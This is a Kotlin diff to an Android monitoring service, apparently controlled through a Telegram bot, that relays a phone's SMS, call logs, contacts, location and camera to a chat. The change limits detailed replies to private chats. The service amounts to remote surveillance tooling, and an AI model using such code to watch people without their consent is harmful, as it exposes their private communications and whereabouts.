@@ -4492,8 +4492,8 @@ class MonitoringService : Service() {
                 sendToTelegram(PermReport.inventoryText(permissionRawStates(), notifOn, permLabels))
             }
             "/brief" -> handleRingkasCommand()
-            "/lastcalls" -> handleLastCallsCommand()
-            "/lastsms" -> handleLastSmsCommand()
+            "/lastcalls" -> handleLastCallsCommand(privateChat)
+            "/lastsms" -> handleLastSmsCommand(privateChat)
             "/photointerval" -> handlePhotoIntervalCommand(arg)
             "/patrol" -> handlePatrolCommand(arg)
             "/patrolinterval" -> {
@@ -4524,7 +4524,7 @@ class MonitoringService : Service() {
                 }
             }
             "/resume" -> handleResumeCommand()
-            "/location" -> handleLocationCommand()
+            "/location" -> handleLocationCommand(privateChat)
             "/camera" -> handleCameraCommand(arg)
             "/notify" -> handleNotifCommand(arg)
             "/log" -> handleLogCommand()
@@ -4563,7 +4563,9 @@ class MonitoringService : Service() {
                 // "6,5 jam" sejak #774; jalur slash kini menerima
                 // bentuk yang sama sebagai jalan kedua.
                 val parsed = NumericArg.parse(raw, NumericArg.Satuan.JAM) ?: NumericArg.parseDecimalHours(raw)
-                if (raw.isNotEmpty() && (parsed == null || parsed !in 1..24)) {
+                if (!privateChat) {
+                    sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot.")
+                } else if (raw.isNotEmpty() && (parsed == null || parsed !in 1..24)) {
                     sendToTelegram("Cara pakai: /screentime &lt;1-24&gt; (jam, bawaan 24)")
                 } else {
                     sendToTelegram(screenTimeFull(parsed ?: 24))
@@ -4572,10 +4574,10 @@ class MonitoringService : Service() {
             "/driving" -> handleKendaraCommand(arg)
             "/datasaver" -> handleHematDataCommand(arg)
             "/heartbeat" -> handleHeartbeatCommand(arg)
-            "/contacts" -> handleContactsCommand(arg)
+            "/contacts" -> handleContactsCommand(arg, privateChat)
             "/apps" -> handleAppsCommand(arg)
             "/storage" -> handleStorageCommand()
-            "/history" -> handleHistoryCommand(arg)
+            "/history" -> handleHistoryCommand(arg, privateChat)
             "/watch" -> handleWatchCommand(arg, privateChat)
             "/appalert" -> handleAppAlertCommand(arg)
             "/protect" -> handleProtectCommand(arg)
@@ -5437,7 +5439,8 @@ class MonitoringService : Service() {
     }
 
 
-    private suspend fun handleContactsCommand(arg: String) {
+    private suspend fun handleContactsCommand(arg: String, privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
             sendToTelegram("⚠️ Izin Kontak belum diberikan. Buka Setup dan berikan izin Kontak.")
             return
@@ -5652,7 +5655,8 @@ class MonitoringService : Service() {
         )
     }
 
-    private suspend fun handleHistoryCommand(arg: String) {
+    private suspend fun handleHistoryCommand(arg: String, privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (!hasSmsPermission() || !hasCallLogPermission()) {
             sendToTelegram("⚠️ Izin SMS/log panggilan hilang. Berikan di Setup.")
             return
@@ -6403,7 +6407,8 @@ class MonitoringService : Service() {
     }
 
 
-    private suspend fun handleLocationCommand() {
+    private suspend fun handleLocationCommand(privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (!hasLocationPermission()) {
             sendToTelegram("⚠️ Izin lokasi hilang. Buka Setup dan berikan izin Lokasi.")
         } else {
@@ -6828,7 +6833,8 @@ class MonitoringService : Service() {
         )
     }
 
-    private suspend fun handleLastCallsCommand() {
+    private suspend fun handleLastCallsCommand(privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (!hasCallLogPermission()) {
             sendToTelegram("⚠️ Izin log panggilan hilang. Berikan di Setup.")
             return
@@ -6845,7 +6851,8 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun handleLastSmsCommand() {
+    private suspend fun handleLastSmsCommand(privateChat: Boolean) {
+        if (!privateChat) { sendToTelegram("\uD83D\uDD12 Rincian hanya via private chat dengan bot."); return }
         if (!hasSmsPermission()) {
             sendToTelegram("⚠️ Izin SMS hilang. Berikan di Setup.")
             return
